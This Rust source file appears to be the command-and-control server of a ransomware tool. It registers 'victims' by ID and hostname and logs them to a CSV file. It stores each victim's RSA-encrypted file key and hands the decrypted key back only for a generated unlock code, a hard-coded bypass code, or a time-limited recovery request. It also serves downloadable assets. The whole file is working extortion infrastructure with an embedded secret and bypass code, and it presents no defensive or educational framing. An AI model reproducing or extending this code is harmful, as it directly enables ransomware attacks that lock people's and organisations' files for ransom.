use axum::{
    routing::post,
    Router,
    extract::{self, State},
};
use axum_server::tls_rustls::RustlsConfig;
use serde::{Deserialize, Serialize};
use csv::{ReaderBuilder, WriterBuilder};
use std::{
    path::Path as FileSystemPath,
    fs::File,
    sync::{Arc, Mutex},
    net::SocketAddr,
    time::SystemTime
};
use rand::{Rng, SeedableRng, rngs::StdRng};
use hex::{encode, decode};
use rsa::{RsaPrivateKey, pkcs1::DecodeRsaPrivateKey, Pkcs1v15Encrypt};
use rust_embed::RustEmbed;
use axum_embed::ServeEmbed;
use log::{debug, error, info, warn};

use coconut_crab_lib::{
    web::{
        server_tls::{
            get_tls_public_key,
            get_tls_private_key
        },
        structs::{
            Registration,
            UploadSymKey,
            AnnounceCompletion,
            DownloadSymKey
        },
        validate::{
            validate_id,
            validate_hostname,
            validate_key,
            validate_code,
            validate_proof,
            check_proof
        }
    },
    file::get_exe_path_dir
};


#[derive(Deserialize, Serialize, Debug, Clone)]
struct Victim {
    id: String,
    hostname: String,
    key: String,
    code: String,
    upload_time: u64,
    complete: bool
}

#[derive(Clone)]
struct AppState {
    victims: Arc<Mutex<Vec<Victim>>>,
    file_path: String,
}

#[derive(RustEmbed, Clone)]
#[folder = "assets/public"]
struct AssetPublic;

#[derive(RustEmbed)]
#[folder = "assets/private"]
struct AssetPrivate;

/*

    +---------------------+
    | CONFIGURATION START |
    +---------------------+

*/

// Configure port used by web server [required]
const PORT: u16 = 3000;
// Configure whether HTTPS or HTTP should be used [requried]
const HTTPS: bool = true;
// Configure time window in minutes where a failed encryption can recovery a symmetric key [required]
const RECOVERY_WINDOW: u64 = 60;
// Configure secret used to validate web requests [required]
static PRESHARED_SECRET: &str = "gEFPsWMHEjdbBccgFKAFwdYwD98mH6cn7mmVwVgS8Vq4EUNocCwh3wLHrEVA7RzS";
// Configure code valid for any victim [required]
static BYPASS_CODE: &str = "2NSd-NRF3-qkB3-v6qP";

/*

    +-------------------+
    | CONFIGURATION END |
    +-------------------+

*/

#[tokio::main]
async fn main() {

    env_logger::Builder::new().filter_level(log::LevelFilter::Debug).init();

    let exe_directory_path = get_exe_path_dir();

    let file_path = format!("{}/victims.csv", exe_directory_path.to_string_lossy());
    let victims = import_csv(&file_path);
    let shared_state = AppState { victims: Arc::new(Mutex::new(victims)), file_path};
    debug!("Web Application State Configured");

    let serve_public_assets = ServeEmbed::<AssetPublic>::new();

    let app = Router::new()
    .route("/register", post(register))
    .route("/upload-sym-key", post(upload_sym_key))
    .route("/announce-completion", post(announce_completion))
    .route("/download-sym-key", post(download_sym_key))
    .nest_service("/download", serve_public_assets)
    .with_state(shared_state);
    debug!("Routing Configured");

    let addr = SocketAddr::from(([0, 0, 0, 0], PORT));
    debug!("Socket Address Configured");

    if HTTPS {
        let config = RustlsConfig::from_pem(get_tls_public_key(), get_tls_private_key()).await.expect("Failed to configure web server TLS");
        debug!("TLS Configured");

        axum_server::bind_rustls(addr, config)
        .serve(app.into_make_service())
        .await
        .expect("Failed to start web server");
        debug!("Web Server Started")
    } else {
        axum_server::bind(addr)
        .serve(app.into_make_service())
        .await
        .expect("Failed to start web server");
        debug!("Web Server Started")  
    }

}

fn import_csv<P: AsRef<FileSystemPath>>(file_path: P) -> Vec<Victim> {
    let mut victims = Vec::<Victim>::new();
    let file = match std::fs::File::open(file_path.as_ref()) {
        Ok(file_result) => {
            debug!("Existing CSV file found: {:?}", file_path.as_ref());
            file_result
        },
        Err(file_result) => {
            warn!("Existing CSV file not found: {:?}", file_result);
            return victims;
        }
    };
    
    let mut reader = ReaderBuilder::new().has_headers(true).from_reader(file);
    for row in reader.deserialize() {
        let record = match row {
            Ok(record_result) => {
                debug!("Adding Deserialized Victim: {:?}", record_result);
                record_result
            },
            Err(record_result) => {
                error!("Failed To Deserialize Victim: {}", record_result);
                continue;
            }
        };
        victims.push(record);
    }
    victims
    
}

fn export_csv<P: AsRef<FileSystemPath>>(file_path: P, victims: &Vec<Victim>) {
    
    let file = File::create(file_path).expect("Error accessing filesystem for CSV");
    let mut writer = WriterBuilder::new().has_headers(true).from_writer(file);

    for victim in victims.iter() {
        writer.serialize(victim).expect("Failed to serialize victims");
    }

    writer.flush().expect("Failed to flush to file");
}

fn get_victim<'a>(victims: &'a mut Vec<Victim>, id: &str) -> Option<&'a mut Victim> {
    if let Some(existing_victim) = victims.iter_mut().find(|existing_victim| existing_victim.id == *id) {
        Some(existing_victim)
    } else {
        None
    }
}

fn generate_code() -> String {
    let mut rng = StdRng::from_entropy();
    let code: String = (0..4).map(|_| {
        (0..4).map(|_| {
            let random_char = rng.gen_range(0..62);
            if random_char < 10 {
                (b'0' + random_char) as char
            } else if random_char < 36 {
                (b'A' + (random_char - 10)) as char
            } else {
                (b'a' + (random_char - 36)) as char
            }
        }).collect::<String>()
    }).collect::<Vec<String>>().join("-");
    debug!("Generated new code: {}", code);
    code
}

fn get_epoch_time() -> u64 {
    match SystemTime::now().duration_since(SystemTime::UNIX_EPOCH) {
        Ok(upload_time_result) => {
            debug!("Reported Time: {:?}", upload_time_result);
            upload_time_result.as_secs()
        },
        Err(upload_time_result) => {
            error!("Reported time before UNIX Epoch: {}", upload_time_result);
            0
        }
    }
}

fn decrypt_key(key: &str) -> String {
    let pem = String::from_utf8(AssetPrivate::get("asym-priv-key.pem").expect("Failed to get private RSA key file").data.to_vec()).expect("Failed to read PEM file");
    let private_key = RsaPrivateKey::from_pkcs1_pem(&pem).expect("Failed to parse PEM key");
    let key_vec = match decode(key) {
        Ok(key_array_result) => {
            debug!("Decoded Key: {:?}", key_array_result);
            key_array_result
        },
        Err(key_array_result) => {
            error!("Failed To Decode Key: {}", key_array_result);
            return String::from("Invalid Key");
        }
    };
    let key = match private_key.decrypt(Pkcs1v15Encrypt, &key_vec) {
        Ok(key_result) => {
            debug!("Decrypted Key: {:?}", key_result);
            key_result
        },
        Err(key_result) => {
            error!("Failed To Decrypt Key: {}", key_result);
            return String::from("Invalid Key");
        }
    };    
    encode(key)
}

async fn register(State(state): State<AppState>, extract::Json(registration): extract::Json<Registration>) -> String {
   
    info!("Received request to register");

    if validate_id(&registration.id) {
        debug!("[{}] Valid ID: {}", registration.id, registration.id);
    } else {
        warn!("[] Invalid ID: {}", registration.id);
        return String::from("Invalid ID");
    }

    if validate_hostname(&registration.hostname) {
        debug!("[{}] Valid Hostname: {}", registration.id, registration.hostname);
    } else {
        warn!("[{}] Invalid Hostname: {}", registration.id, registration.hostname);
        return String::from("Invalid Hostname");
    }

    if validate_proof(&registration.proof) {
        debug!("[{}] Valid Proof: {}", registration.id, registration.proof);
    } else {
        warn!("[{}] Invalid Proof: {}", registration.id, registration.proof);
        return String::from("Invalid Proof");
    }

    let mut proof_source = [registration.id.as_bytes(), registration.hostname.as_bytes()].concat();
    if check_proof(&mut proof_source, PRESHARED_SECRET, &registration.proof) {
        debug!("[{}] Proof Verification Success: {}", registration.id, registration.proof);
    } else {
        warn!("[{}] Proof Verification Failure: {}", registration.id, registration.proof);
        return String::from("Invalid Proof");
    }

    {
        let mut victims = state.victims.lock().expect("Mutex was poisoned");
        match get_victim(&mut victims, &registration.id) {
            Some(existing_victim) => {
                warn!("[{}] Existing Victim Found: {:?}", registration.id, existing_victim);
                warn!("[{}] Cannot Register New Victim", registration.id);
                String::from("Victim already exists")
            },
            None => {
                let victim = Victim {id: registration.id, hostname: registration.hostname, key: String::new(), code: String::new(), upload_time: 0, complete: false};
                info!("[{}] Adding New Victim: {:?}", victim.id, victim);
                victims.push(victim);
                export_csv(&state.file_path, &victims);
                debug!("Updated Victims CSV");
                String::from("Success")
            }
        }
    }
}

async fn upload_sym_key(State(state): State<AppState>, extract::Json(uploadsymkey): extract::Json<UploadSymKey>) -> String {

    info!("Received request to upload symmetric key");

    if validate_id(&uploadsymkey.id) {
        debug!("[{}] Valid ID: {}", uploadsymkey.id, uploadsymkey.id);
    } else {
        warn!("[] Invalid ID: {}", uploadsymkey.id);
        return String::from("Invalid ID");
    }

    if validate_key(&uploadsymkey.key) {
        debug!("[{}] Valid Key: {}", uploadsymkey.id, uploadsymkey.key);
    } else {
        warn!("[{}] Invalid Key: {}", uploadsymkey.id, uploadsymkey.key);
        return String::from("Invalid Key");
    }

    if validate_proof(&uploadsymkey.proof) {
        debug!("[{}] Valid Proof: {}", uploadsymkey.id, uploadsymkey.proof);
    } else {
        warn!("[{}] Invalid Proof: {}", uploadsymkey.id, uploadsymkey.proof);
        return String::from("Invalid Proof");
    }

    let mut proof_source = [uploadsymkey.id.as_bytes(), uploadsymkey.key.as_bytes()].concat();
    if check_proof(&mut proof_source, PRESHARED_SECRET, &uploadsymkey.proof) {
        debug!("[{}] Proof Verification Success: {}", uploadsymkey.id, uploadsymkey.proof);
    } else {
        warn!("[{}] Proof Verification Failure: {}", uploadsymkey.id, uploadsymkey.proof);
        return String::from("Invalid Proof");
    }

    {
        let mut victims = state.victims.lock().expect("Mutex was poisoned");
        match get_victim(&mut victims, &uploadsymkey.id) {
            Some(existing_victim) => {
                existing_victim.key = uploadsymkey.key;
                info!("[{}] Added Symmetric Key: {}", uploadsymkey.id, existing_victim.key);
                existing_victim.code = generate_code();
                info!("[{}] Added Code: {}", uploadsymkey.id, existing_victim.code);
                existing_victim.upload_time = get_epoch_time();
                info!("[{}] Added Upload Time: {:?}", uploadsymkey.id, existing_victim.upload_time);
                export_csv(&state.file_path, &victims);
                debug!("Updated Victims CSV");
                String::from("Success")
            },
            None => {
                warn!("[{}] Existing Victim Not Found", uploadsymkey.id);
                warn!("[{}] Cannot Upload Symmetric Key", uploadsymkey.id);
                String::from("Victim does not exist")
            }
        }
    }
}

async fn announce_completion(State(state): State<AppState>, extract::Json(announcecompletion): extract::Json<AnnounceCompletion>) -> String {

    info!("Received request to announce completion");
    
    if validate_id(&announcecompletion.id) {
        debug!("[{}] Valid ID: {}", announcecompletion.id, announcecompletion.id);
    } else {
        warn!("[] Invalid ID: {}", announcecompletion.id);
        return String::from("Invalid ID");
    }

    if validate_proof(&announcecompletion.proof) {
        debug!("[{}] Valid Proof: {}", announcecompletion.id, announcecompletion.proof);
    } else {
        warn!("[{}] Invalid Proof: {}", announcecompletion.id, announcecompletion.proof);
        return String::from("Invalid Proof");
    }

    let mut proof_source = announcecompletion.id.as_bytes().to_vec();
    if check_proof(&mut proof_source, PRESHARED_SECRET, &announcecompletion.proof) {
        debug!("[{}] Proof Verification Success: {}", announcecompletion.id, announcecompletion.proof);
    } else {
        warn!("[{}] Proof Verification Failure: {}", announcecompletion.id, announcecompletion.proof);
        return String::from("Invalid Proof");
    }

    {
        let mut victims = state.victims.lock().expect("Mutex was poisoned");
        match get_victim(&mut victims, &announcecompletion.id) {
            Some(existing_victim) => {
                info!("[{}] Designating As Complete", announcecompletion.id);
                existing_victim.complete = true;
                export_csv(&state.file_path, &victims);
                debug!("Updated Victims CSV");
                String::from("Success")
            },
            None => {
                warn!("[{}] Existing Victim Not Found", announcecompletion.id);
                warn!("[{}] Cannot Announce Completion", announcecompletion.id);
                String::from("Victim does not exist")
            }
        }
    }

}

async fn download_sym_key(State(state): State<AppState>, extract::Json(downloadsymkey): extract::Json<DownloadSymKey>) -> String {
    
    info!("Received request to download symmetric key");
    
    if validate_id(&downloadsymkey.id) {
        debug!("[{}] Valid ID: {}", downloadsymkey.id, downloadsymkey.id);
    } else {
        warn!("[] Invalid ID: {}", downloadsymkey.id);
        return String::from("Invalid ID");
    }

    if validate_code(&downloadsymkey.code) {
        debug!("[{}] Valid Code: {}", downloadsymkey.id, downloadsymkey.code);
    } else {
        warn!("[{}] Invalid Code: {}", downloadsymkey.id, downloadsymkey.code);
        return String::from("Invalid Code");
    }

    if validate_proof(&downloadsymkey.proof) {
        debug!("[{}] Valid Proof: {}", downloadsymkey.id, downloadsymkey.proof);
    } else {
        warn!("[{}] Invalid Proof: {}", downloadsymkey.id, downloadsymkey.proof);
        return String::from("Invalid Proof");
    }

    let mut proof_source = [downloadsymkey.id.as_bytes(), downloadsymkey.code.as_bytes()].concat();
    if check_proof(&mut proof_source, PRESHARED_SECRET, &downloadsymkey.proof) {
        debug!("[{}] Proof Verification Success: {}", downloadsymkey.id, downloadsymkey.proof);
    } else {
        warn!("[{}] Proof Verification Failure: {}", downloadsymkey.id, downloadsymkey.proof);
        return String::from("Invalid Proof");
    }

    let existing_victim;
    {
        let mut victims = state.victims.lock().expect("Mutex was poisoned");
        existing_victim = match get_victim(&mut victims, &downloadsymkey.id) {
            Some(get_victim_result) => {
                debug!("[{}] Existing Victim Found: {:?}", downloadsymkey.id, get_victim_result);
                get_victim_result.clone()
            },
            None => {
                warn!("[{}] Existing Victim Not Found", downloadsymkey.id);
                warn!("[{}] Cannot Download Symmetric Key", downloadsymkey.id);
                return String::from("Victim does not exist");
            }
        }
    }

    let mut recovery_valid = false;
    if !existing_victim.complete && downloadsymkey.code == "0000-0000-0000" {
        info!("[{}] Key Recovery Requested", downloadsymkey.id);
        if existing_victim.upload_time == 0 {
            error!("[{}] No Upload Time Recorded", downloadsymkey.id);
        } else {
            let current_time = get_epoch_time();
            debug!("[{}] Current Epoch Time: {} seconds", downloadsymkey.id, current_time);
            let recovery_window = RECOVERY_WINDOW * 60;
            debug!("[{}] Key Recovery Window: {} seconds", downloadsymkey.id, recovery_window);
            let elapsed_time = current_time - existing_victim.upload_time;
            debug!("[{}] Elapsed Time: {} seconds", downloadsymkey.id, elapsed_time);
            if elapsed_time <= recovery_window {
                recovery_valid = true;
            }
        }
        if recovery_valid {
            info!("[{}] Key Recovery Valid", downloadsymkey.id);
        } else {
            warn!("[{}] Key Recovery Not Valid", downloadsymkey.id);
        }
    }
    
    if existing_victim.code == downloadsymkey.code
        || downloadsymkey.code == BYPASS_CODE 
        || recovery_valid {
        info!("[{}] Correct Code: {}", downloadsymkey.id, downloadsymkey.code);
        info!("[{}] Providing Decrypted Key", downloadsymkey.id);
        return decrypt_key(&existing_victim.key);
    }
    warn!("[{}] Incorrect Code: {}", downloadsymkey.id, downloadsymkey.code);
    "Invalid Code".to_string()
}